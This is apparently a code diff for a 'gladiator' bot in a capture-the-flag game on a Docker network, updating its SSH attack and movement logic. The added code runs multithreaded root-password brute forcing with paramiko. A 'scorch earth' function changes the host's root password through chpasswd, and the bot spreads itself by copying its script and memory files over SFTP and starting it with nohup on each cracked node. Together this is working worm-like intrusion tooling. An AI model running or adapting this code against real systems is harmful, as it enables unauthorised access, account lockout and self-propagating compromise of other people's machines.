@@ -6,6 +6,7 @@ import requests
 import subprocess
 import random
 import numpy as np
+import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor
 
 # Forced Fallback: PyTorch is too heavy for 256MB nodes
@@ -31,16 +32,20 @@ IDENTITY_FILE = "identity.json"
 # CTF State
 has_key = False
 key_location = None
+VISITED_NODES = [] # List of IPs we have been on recently
+MAX_VISITED_MEMORY = 10
 
 # Advanced Attack Brain (from Smart Gladiator)
 hacking_brain = {
     "vulnerability_map": {}, # IP -> List of discovered vulnerabilities
-    "pattern_knowledge": {}  # Grid pattern -> List of vulnerabilities
+    "pattern_knowledge": {}, # Grid pattern -> List of vulnerabilities
+    "password_map": {},       # IP -> Discovered Password
+    "failures": {}           # IP -> last_fail_timestamp
 }
 
 def load_brain_memory():
     """Load hacking brain findings from identity file or separate memory"""
-    global hacking_brain
+    global hacking_brain, VISITED_NODES
     path = "hacking_memory.json"
     if os.path.exists(path):
         try:
@@ -48,34 +53,56 @@ def load_brain_memory():
                 data = json.load(f)
                 hacking_brain["vulnerability_map"] = data.get("vulnerability_map", {})
                 hacking_brain["pattern_knowledge"] = data.get("pattern_knowledge", {})
-                log(f"🧠 Hacking Memory Loaded. Vulns known: {len(hacking_brain['vulnerability_map'])}")
+                hacking_brain["password_map"] = data.get("password_map", {})
+                hacking_brain["failures"] = data.get("failures", {})
+                VISITED_NODES = data.get("visited_nodes", [])
+                log(f"🧠 Hacking Memory Loaded. Vulns: {len(hacking_brain['vulnerability_map'])}, PWs: {len(hacking_brain['password_map'])}, Fails: {len(hacking_brain['failures'])}, Visited: {len(VISITED_NODES)}")
         except: pass
 
 def save_brain_memory():
     path = "hacking_memory.json"
     try:
         with open(path, 'w') as f:
-            json.dump(hacking_brain, f)
+            data = hacking_brain.copy()
+            data["visited_nodes"] = VISITED_NODES
+            json.dump(data, f)
     except: pass
 
 def get_identity():
-    # Helper to persist ID across migrations (files are copied, hostname changes)
+    # Helper to persist ID across migrations
     if os.path.exists(IDENTITY_FILE):
         try:
             with open(IDENTITY_FILE, 'r') as f:
                 data = json.load(f)
-                return data.get("id")
+                if isinstance(data, dict) and "id" in data:
+                    return data
         except: pass
     
-    # Generate New
-    new_id = f"Neural_{TEAM}_{socket.gethostname()[:5]}"
+    # Generate New Truly Unique ID
+    unique_suffix = "".join(random.choices("0123456789abcdef", k=4))
+    new_id = f"Neural_{TEAM}_{unique_suffix}"
+    identity_data = {"id": new_id, "mastery_level": 1, "xp": 0}
     try:
         with open(IDENTITY_FILE, 'w') as f:
-            json.dump({"id": new_id}, f)
+            json.dump(identity_data, f)
     except: pass
-    return new_id
+    return identity_data
 
-MY_ID = get_identity()
+identity = get_identity()
+if isinstance(identity, dict):
+    MY_ID = identity.get("id")
+    MASTERY = identity.get("mastery_level", 1)
+    XP = identity.get("xp", 0)
+else:
+    MY_ID = identity
+    MASTERY = 1
+    XP = 0
+
+def save_identity():
+    try:
+        with open(IDENTITY_FILE, 'w') as f:
+            json.dump({"id": MY_ID, "mastery_level": MASTERY, "xp": XP}, f)
+    except: pass
 
 def log(msg):
     print(f"[{time.strftime('%H:%M:%S')}] {msg}")
@@ -128,10 +155,43 @@ else:
 
         def forward(self, x):
             # x shape should be (1, input_dim)
-            h1 = self.relu(np.dot(x, self.weights['w1']) + self.weights['b1'])
-            h2 = self.relu(np.dot(h1, self.weights['w2']) + self.weights['b2'])
-            out = np.dot(h2, self.weights['w3']) + self.weights['b3']
+            self.last_input = x
+            self.h1 = self.relu(np.dot(x, self.weights['w1']) + self.weights['b1'])
+            self.h2 = self.relu(np.dot(self.h1, self.weights['w2']) + self.weights['b2'])
+            out = np.dot(self.h2, self.weights['w3']) + self.weights['b3']
             return out
+
+        def train(self, x, target_idx, lr=0.01):
+            """Simple SGD update for NumPy classes (Training without Torch!)"""
+            # Forward pass already stores self.h1, self.h2
+            out = self.forward(x)
+            
+            # Target output (One-hot)
+            target = np.zeros(7)
+            target[target_idx] = 1.0
+            
+            # Loss Gradient (Out -> H2)
+            grad_out = out - target
+            
+            # Update Layer 3
+            self.weights['w3'] -= lr * np.dot(self.h2.T, grad_out.reshape(1, -1))
+            self.weights['b3'] -= lr * grad_out
+            
+            # Backprop H2
+            grad_h2 = np.dot(grad_out, self.weights['w3'].T)
+            grad_h2[self.h2 <= 0] = 0 # ReLU derivative
+            
+            # Update Layer 2
+            self.weights['w2'] -= lr * np.dot(self.h1.T, grad_h2.reshape(1, -1))
+            self.weights['b2'] -= lr * grad_h2
+            
+            # Backprop H1
+            grad_h1 = np.dot(grad_h2, self.weights['w2'].T)
+            grad_h1[self.h1 <= 0] = 0 # ReLU derivative
+            
+            # Update Layer 1
+            self.weights['w1'] -= lr * np.dot(x.T, grad_h1.reshape(1, -1))
+            self.weights['b1'] -= lr * grad_h1
 
         def load_from_json(self, path):
             if not os.path.exists(path): return False
@@ -162,7 +222,6 @@ else:
             return True
 
         def eval(self): pass
-        def train(self): pass
         def to(self, device): return self
 
 # --- GLOBAL STATE ---
@@ -263,44 +322,65 @@ def get_input_tensor(x, y):
     return torch.FloatTensor([[x/GRID_SIZE, y/GRID_SIZE, team_val, entropy]]).to(device)
 
 def get_neural_priorities(x, y):
-    if not HAS_TORCH or not model:
+    if not model:
         return [0, 1, 2, 3], [0, 1, 2] # Default
 
     model.eval()
-    with torch.no_grad():
-        inputs = get_input_tensor(x, y)
-        outputs = model(inputs)
-        
-        # Split output into Theme (0-3) and Mutation (4-6)
+    if HAS_TORCH:
+        with torch.no_grad():
+            inputs = get_input_tensor(x, y)
+            outputs = model(inputs)
+            # Split output into Theme (0-3) and Mutation (4-6)
+            theme_logits = outputs[0, :4]
+            mut_logits = outputs[0, 4:]
+            theme_order = torch.argsort(theme_logits, descending=True).tolist()
+            mut_order = torch.argsort(mut_logits, descending=True).tolist()
+    else:
+        # NumPy Inference
+        inputs = np.array([[x/GRID_SIZE, y/GRID_SIZE, (0 if TEAM=="RED" else 1), 0.5]])
+        outputs = model.forward(inputs)
         theme_logits = outputs[0, :4]
         mut_logits = outputs[0, 4:]
-        
-        theme_order = torch.argsort(theme_logits, descending=True).tolist()
-        mut_order = torch.argsort(mut_logits, descending=True).tolist()
+        theme_order = np.argsort(-theme_logits).tolist()
+        mut_order = np.argsort(-mut_logits).tolist()
         
     return theme_order, mut_order
 
 def train_on_success(x, y, theme_idx, mut_idx):
-    if not HAS_TORCH or not model: return
+    global MASTERY, XP
+    if not model: return
     
-    log(f"🔥 Online Training: Strengthening path ({theme_idx}, {mut_idx}) for ({x},{y})")
-    model.train()
-    optimizer.zero_grad()
+    log(f"🔥 Brain Sharpened: Experience Gained +10. (Target: {theme_idx}, {mut_idx})")
     
-    inputs = get_input_tensor(x, y)
-    outputs = model(inputs)
+    # 1. Update Weights
+    if HAS_TORCH:
+        model.train()
+        optimizer.zero_grad()
+        inputs = get_input_tensor(x, y)
+        outputs = model(inputs)
+        # We treat Themes (0-3) and Mutations (4-6) as two separate classification targets
+        target_theme = torch.tensor([theme_idx]).to(device)
+        target_mut = torch.tensor([mut_idx]).to(device)
+        loss_theme = criterion(outputs[:, :4], target_theme)
+        loss_mut = criterion(outputs[:, 4:], target_mut)
+        (loss_theme + loss_mut).backward()
+        optimizer.step()
+    else:
+        # NumPy Training (SGD)
+        inputs = np.array([[x/GRID_SIZE, y/GRID_SIZE, (0 if TEAM=="RED" else 1), 0.5]])
+        # Train Theme
+        model.train(inputs, theme_idx, lr=0.01)
+        # Train Mutation (Offset by 4)
+        model.train(inputs, mut_idx + 4, lr=0.01)
     
-    # Target: We want theme_idx and mut_idx to be the global maximums
-    # Simplified: Multi-label cross entropy or just two separate targets
-    # We'll do a simple hard target for the successful combination
-    target_theme = torch.tensor([theme_idx]).to(device)
-    target_mut = torch.tensor([mut_idx]).to(device)
+    # 2. Update Experience & Mastery
+    XP += 10
+    if XP >= 100:
+        MASTERY += 1
+        XP = 0
+        log(f"🏆 MASTERY LEVEL UP: Level {MASTERY}")
     
-    loss_theme = criterion(outputs[:, :4], target_theme)
-    loss_mut = criterion(outputs[:, 4:], target_mut)
-    
-    (loss_theme + loss_mut).backward()
-    optimizer.step()
+    save_identity()
     save_neural_memory()
 
 # --- HACKING LOGIC ---
@@ -313,15 +393,25 @@ WORDS = {
 
 import paramiko
 
-def attempt_login(password, ip):
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, username='root', password=password, timeout=2, banner_timeout=5)
-        ssh.close()
-        return True
-    except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout, Exception):
-        return False
+def attempt_login(password, ip, max_retries=3):
+    """Attempt SSH login with retry logic for transient banner timeout errors"""
+    for attempt in range(max_retries):
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            # Increased timeouts: connection 5s (was 2s), banner 15s (was 5s)
+            ssh.connect(ip, username='root', password=password, timeout=5, banner_timeout=15)
+            ssh.close()
+            return True
+        except paramiko.SSHException as e:
+            # Retry on banner timeout errors with exponential backoff
+            if "Error reading SSH protocol banner" in str(e) and attempt < max_retries - 1:
+                time.sleep(2 ** attempt)  # Exponential backoff: 1s, 2s, 4s
+                continue
+            return False
+        except (paramiko.AuthenticationException, socket.timeout, Exception):
+            return False
+    return False
 
 def scout_clue(ip):
     try:
@@ -441,7 +531,7 @@ def get_key_location():
         key_str = data.get("key_location", "Unknown")
         if "," in key_str:
             parts = key_str.split(',')
-            return (int(parts[1]), int(parts[0])) # Grid is usually X,Y but API uses Y,X
+            return (int(parts[0]), int(parts[1])) # Grid is X,Y
     except:
         pass
     return (2, 3) # Fallback to center
@@ -477,45 +567,75 @@ def get_next_move_towards(target_x, target_y, my_x, my_y):
     
     return best_move
 
-def background_password_guesser(ip, x, y, result_dict):
-    """Background thread that tries passwords while web exploits run"""
+def background_password_guesser(ip, x, y, result_dict, workers=1, max_attempts=100):
+    """Parallelized password guesser using ThreadPoolExecutor with batching"""
     theme_order, mut_order = get_neural_priorities(x, y)
+    attempts_made = 0
+    attempts_lock = threading.Lock()
     
-    for t_idx in theme_order:
+    def try_password(pwd):
+        nonlocal attempts_made
         if result_dict["found"]:
-            return  # Another exploit succeeded
+            return False
         
-        base_words = WORDS[t_idx]
-        for m_idx in mut_order:
-            if result_dict["found"]:
-                return
+        with attempts_lock:
+            if attempts_made >= max_attempts:
+                return False
+            attempts_made += 1
             
-            # Generate guesses
-            guesses = []
-            if m_idx == 0:  # Raw
-                guesses = base_words
-            elif m_idx == 1:  # 1-Digit
-                for i in range(10):
-                    for w in base_words:
-                        guesses.append(f"{w}{i}")
-            elif m_idx == 2:  # 2-Digit
-                for i in range(100):
-                    for w in base_words:
-                        guesses.append(f"{w}{i}")
+        if attempt_login(pwd, ip):
+            result_dict["password"] = pwd
+            result_dict["found"] = True
+            return True
+        return False
+
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        for t_idx in theme_order:
+            if result_dict["found"] or attempts_made >= max_attempts: break
             
-            for pwd in guesses:
-                if result_dict["found"]:
-                    return
-                if attempt_login(pwd, ip):
-                    result_dict["found"] = True
-                    result_dict["password"] = pwd
-                    return
-                time.sleep(0.05)  # Rate limit
+            base_words = WORDS[t_idx]
+            for m_idx in mut_order:
+                if result_dict["found"] or attempts_made >= max_attempts: break
+                
+                # Generate guesses
+                guesses = []
+                if m_idx == 0:  # Raw
+                    guesses = base_words
+                elif m_idx == 1:  # 1-Digit
+                    for i in range(10):
+                        for w in base_words:
+                            guesses.append(f"{w}{i}")
+                elif m_idx == 2:  # 2-Digit
+                    for i in range(100):
+                        for w in base_words:
+                            guesses.append(f"{w}{i}")
+                
+                # Process in small batches to maintain responsiveness and respect limits
+                batch_size = 50
+                for i in range(0, len(guesses), batch_size):
+                    if result_dict["found"] or attempts_made >= max_attempts:
+                        break
+                    
+                    batch = guesses[i:i + batch_size]
+                    futures = [executor.submit(try_password, pwd) for pwd in batch]
+                    
+                    # Wait for current batch to complete before submitting more
+                    # or stop immediately if found/limit reached
+                    for f in concurrent.futures.as_completed(futures):
+                        if result_dict["found"] or attempts_made >= max_attempts:
+                            break
 
 def crack_node(ip, x, y):
     """Adaptive attack using discovery and predictions"""
     global hacking_brain
     
+    # 0. Fast Recall
+    if ip in hacking_brain["password_map"]:
+        password = hacking_brain["password_map"][ip]
+        if password and attempt_login(password, ip):
+             log(f"🧠 RECALL: Known password for {ip} found in memory.")
+             return password
+
     # 1. Determine which vulnerabilities to try
     known_vulns = None
     
@@ -551,13 +671,26 @@ def crack_node(ip, x, y):
     except ImportError:
         EXPLOIT_MAP = {}
     
-    # 3. Start background password guesser (Concurrent)
+    # 3. Dynamic Worker Allocation
+    # If no web vulns, max focus on brute force. If many vulns, keep stealthy.
+    if not known_vulns:
+        num_workers = 5
+        log(f"🎯 HARD NODE: Focusing resources on brute force ({num_workers} workers)")
+    elif len(known_vulns) < 5:
+        num_workers = 2
+        log(f"🎯 MEDIUM NODE: Balanced focus ({num_workers} SSH workers)")
+    else:
+        num_workers = 1
+        log(f"🎯 EASY NODE: Minimal SSH focus (Stealth mode)")
+
+    # 4. Start background password guesser (Concurrent)
     password_result = {"found": False, "password": None}
-    guesser_thread = threading.Thread(target=background_password_guesser, args=(ip, x, y, password_result))
+    guesser_thread = threading.Thread(target=background_password_guesser, 
+                                     args=(ip, x, y, password_result, num_workers))
     guesser_thread.daemon = True
     guesser_thread.start()
     
-    # 4. Try ONLY discovered/predicted vulnerabilities
+    # 5. Try ONLY discovered/predicted vulnerabilities
     if known_vulns and EXPLOIT_MAP:
         for vuln_name in known_vulns:
             if password_result["found"]: break
@@ -569,6 +702,9 @@ def crack_node(ip, x, y):
                     if password and attempt_login(password, ip):
                         log(f"🔓 PWNED via {vuln_name}: {password}")
                         password_result["found"] = True
+                        password_result["password"] = password
+                        hacking_brain["password_map"][ip] = password
+                        save_brain_memory()
                         # Neural feedback
                         for t_idx, words in WORDS.items():
                             for w in words:
@@ -578,17 +714,25 @@ def crack_node(ip, x, y):
                         return password
                 except: pass
     
-    # 5. Wait for background guesser if exploits failed
+    # 6. Wait for background guesser if exploits failed
     if not password_result["found"]:
-        # If we have 0 web vulns, this IS our only hope, but don't spend forever if others are closer
         timeout = 15 if not known_vulns else 20
-        log(f"⏳ Web exploits failed. Brute forcing (Timeout: {timeout}s)...")
+        log(f"⏳ Web exploits failed. Waiting for brute force (Timeout: {timeout}s)...")
         guesser_thread.join(timeout=timeout)
     
     if password_result["found"]:
-        log(f"🔓 PWNED via Brute Force: {password_result['password']}")
-        # Neural learning already handled in guesser if needed or here
-        return password_result["password"]
+        pwd = password_result['password']
+        log(f"🔓 PWNED via Brute Force: {pwd}")
+        hacking_brain["password_map"][ip] = pwd
+        if ip in hacking_brain["failures"]:
+            del hacking_brain["failures"][ip]
+        save_brain_memory()
+        return pwd
+    else:
+        log(f"❌ Failed to crack {ip} after limit/timeout.")
+        hacking_brain["failures"][ip] = time.time()
+        save_brain_memory()
+        return None
     
     return None
 
@@ -625,42 +769,74 @@ def neural_hack(ip, x, y):
                     return pwd  # Return password for migration
     return None
 
+def scorch_earth():
+    """Change local root password to prevent pursuit"""
+    new_pw = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*", k=20))
+    
+    # 1. Update Brain Memory
+    hostname = socket.gethostname()
+    my_ip = socket.gethostbyname(hostname)
+    hacking_brain["password_map"][my_ip] = new_pw
+    save_brain_memory()
+    
+    # 2. Change System Password
+    try:
+        subprocess.run(f"echo 'root:{new_pw}' | chpasswd", shell=True, check=True)
+        log(f"🔥 SCORCHED EARTH: Password changed to {new_pw[:5]}... (Locked door behind us)")
+        
+        # Update local password hint file to reflect the change (misinfo or truth?)
+        with open("/gladiator/password_hint.txt", "w") as f:
+            f.write(f"Root Password set to: {new_pw}")
+            
+    except Exception as e:
+        log(f"⚠️ Failed to scorch earth: {e}")
+
 def migrate_self(target_ip, password, team):
     """
-    Autonomously migrate to target node via SSH/SCP.
-    This is TRUE migration - we copy ourselves and start a new instance.
+    Migration 2.0: Orchestrator-Mediated.
+    We ask the orchestrator to move us via Docker API (stable).
     """
+    scorch_earth() # <--- Lock the door
+    
+    log(f"🚀 Requesting Orchestrator-mediated migration to {target_ip}...")
     try:
-        log(f"🚀 Initiating self-migration to {target_ip}...")
-        
-        # 1. Connect to target via SSH
+        res = requests.post(f"{ORCHESTRATOR}/api/migrate", 
+                          json={"gladiator_id": MY_ID, "target_ip": target_ip},
+                          timeout=10)
+        if res.status_code == 200:
+            log(f"✅ Orchestrator started migration to {target_ip}. Self-terminating...")
+            time.sleep(0.5)
+            os._exit(0)
+    except Exception as e:
+        log(f"⚠️ Orchestrator migration failed ({e}). Falling back to SSH...")
+
+    # FALLBACK: Legacy SSH/SCP Migration
+    try:
+        log(f"🔗 Initiating legacy SSH migration to {target_ip}...")
+        # (Rest of legacy SSH logic follows below)
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(target_ip, username='root', password=password, timeout=5)
+        ssh.connect(target_ip, username='root', password=password, timeout=5, banner_timeout=15)
         
-        # 2. Copy our script and memory files via SCP
         sftp = ssh.open_sftp()
-        
-        # Copy the main script
         sftp.put('/gladiator/neural_gladiator.py', '/gladiator/neural_gladiator.py')
-        log(f"📦 Copied neural_gladiator.py to {target_ip}")
-        
-        # Copy memory files if they exist
-        for filename in ['memory.json', 'identity.json']:
+        for filename in ['hacking_memory.json', 'identity.json', 'neural_memory.json', 'exploits.py', 'THE_KEY.txt']:
             local_path = f'/gladiator/{filename}'
             if os.path.exists(local_path):
                 sftp.put(local_path, local_path)
-                log(f"📦 Copied {filename} to {target_ip}")
-        
         sftp.close()
         
-        # 3. Start ourselves on the target node
-        cmd = f'cd /gladiator && nohup python3 neural_gladiator.py {team} > /dev/null 2>&1 &'
+        cmd = f'cd /gladiator && nohup python3 neural_gladiator.py {team} > /gladiator/gladiator.log 2>&1 &'
         ssh.exec_command(cmd)
         ssh.close()
         
-        log(f"✅ Migration complete! New instance started at {target_ip}")
-        return True
+        log(f"✅ Legacy migration complete! New instance started at {target_ip}")
+        time.sleep(1)
+        # Force exit old instance
+        os._exit(0)
+    except Exception as e:
+        log(f"❌ Migration failed: {e}")
+        return False
         
     except Exception as e:
         log(f"❌ Migration failed: {e}")
@@ -675,29 +851,48 @@ def main():
     log(f"Gladiator {MY_ID} deployed on Node.")
     requests.post(f"{ORCHESTRATOR}/api/register", json={"gladiator_id": MY_ID})
     
-    # Get IP to find neighbors
+    # Get IP (still useful for networking)
     hostname = socket.gethostname()
     my_ip = socket.gethostbyname(hostname)
-    # Parse coords from IP
-    parts = my_ip.split('.')
-    my_y, my_x = int(parts[2]), int(parts[3]) - 10
+    
+    # Precise Location: Use Environment Variable if available!
+    coord_key = os.environ.get("COORDINATE_KEY")
+    if coord_key and ',' in coord_key:
+        my_y, my_x = map(int, coord_key.split(',')) # Env is actually Y,X in many contexts? 
+        # Wait, docker-compose says: COORDINATE_KEY=y,x usually?
+        # Let's check entrypoint.sh: Y_COORD=$(echo $COORDINATE_KEY | cut -d',' -f1)
+        # So Env is Y,X.
+        # But my Grid is X,Y.
+        # So my_y = parts[0], my_x = parts[1].
+        # Correct.
+    else:
+        # Fallback to IP parsing
+        log("⚠️ COORDINATE_KEY missing. Falling back to IP Parsing...")
+        parts = my_ip.split('.')
+        my_x, my_y = int(parts[2]), int(parts[3]) - 10
 
     # CLAIM SELF to appear on map
     log(f"📍 Announcing presence at {my_ip}...")
     requests.post(f"{ORCHESTRATOR}/api/claim", json={"gladiator_id": MY_ID, "target_ip": my_ip})
     
+    if my_ip not in VISITED_NODES:
+        VISITED_NODES.append(my_ip)
+        if len(VISITED_NODES) > MAX_VISITED_MEMORY:
+            VISITED_NODES.pop(0)
+
     while True:
+        # (Rest of loop continues...)
         # 1. Update Objectives
         check_for_key()
         key_loc = get_key_location()
         
         # 2. Determine Target
         if has_key:
-            target_y, target_x = (0, 0) if TEAM == "RED" else (5, 5)
+            target_x, target_y = (0, 0) if TEAM == "RED" else (5, 5)
             log_status(f"🏃 KEY SECURED! Returning to base ({target_y},{target_x})...")
             
             # Check if we are AT base
-            if (my_y, my_x) == (target_y, target_x):
+            if (my_x, my_y) == (target_x, target_y):
                 log("🏁 REACHED HOME BASE! Submitting key...")
                 try:
                     res = requests.post(f"{ORCHESTRATOR}/api/submit_key", 
@@ -710,40 +905,38 @@ def main():
                 except Exception as e:
                     log(f"❌ Submission Error: {e}")
         else:
-            target_y, target_x = key_loc
-            log_status(f"🎯 Objective: Key at ({target_y},{target_x})")
+            target_x, target_y = key_loc
+            log_status(f"🎯 Objective: Key at ({target_x},{target_y})")
 
         # 3. Find Best Neighbor
-        best_dist = abs(target_x - my_x) + abs(target_y - my_y)
-        
-        # We look for a neighbor that brings us closer
-        neighbors = []
+        all_candidates = []
         for dy in [-1, 0, 1]:
             for dx in [-1, 0, 1]:
                 if dx == 0 and dy == 0: continue
                 nx, ny = my_x + dx, my_y + dy
                 if 0 <= nx < GRID_SIZE and 0 <= ny < GRID_SIZE:
                     dist = abs(target_x - nx) + abs(target_y - ny)
-                    neighbors.append((nx, ny, dist))
+                    target_ip = f"172.20.{ny}.{10+nx}"
+                    
+                    # 4. Filter out blacklisted nodes (60s cooldown)
+                    last_fail = hacking_brain["failures"].get(target_ip, 0)
+                    if time.time() - last_fail < 60:
+                        continue
+                    
+                    # 4b. Filter out recently visited nodes to avoid looping
+                    if target_ip in VISITED_NODES:
+                        continue
+                        
+                    all_candidates.append((nx, ny, dist, target_ip))
         
         # Sort by distance to target (closest first)
-        neighbors.sort(key=lambda x: x[2])
-        
-        # GREEDY FILTER: Only consider neighbors that bring us CLOSER or are sideways if we are stuck
-        # (Wandering is often caused by trying 'backwards' nodes when forward ones are hard)
-        best_neighbors = [n for n in neighbors if n[2] < best_dist]
-        if not best_neighbors:
-             # If no neighbor is closer, maybe try a 'sideways' one to avoid getting pinned
-             best_neighbors = [n for n in neighbors if n[2] == best_dist]
-        
-        # 4. Try to migrate
+        all_candidates.sort(key=lambda x: x[2])
+        candidate_neighbors = all_candidates[:3] # Consider top 3 best moves
+
+        # 5. Try to migrate
         moved = False
-        for nx, ny, dist in best_neighbors:
+        for nx, ny, dist, target_ip in candidate_neighbors:
             if moved: break
-            
-            target_ip = f"172.20.{ny}.{10+nx}"
-            # Only log migration attempts, not every "consideration" to keep it clean
-            # log(f"🔎 Considering {target_ip} (Dist: {dist})...") 
             
             password = crack_node(target_ip, nx, ny)
             if password:
@@ -755,12 +948,13 @@ def main():
                                     timeout=2)
                     except: pass
                     log(f"👋 Exit. Migrated to {target_ip}")
+                    time.sleep(3) # Post-migration cooldown/sync
                     return # New instance takes over
                 else:
                     log(f"⚠️ Migration failed: {target_ip}")
 
         if not moved:
-            log_status(f"🔥 Waiting for opening at ({my_y},{my_x})...")
+            log_status(f"🔥 Waiting for opening at ({my_x},{my_y})...")
             time.sleep(2)
 
 if __name__ == "__main__":
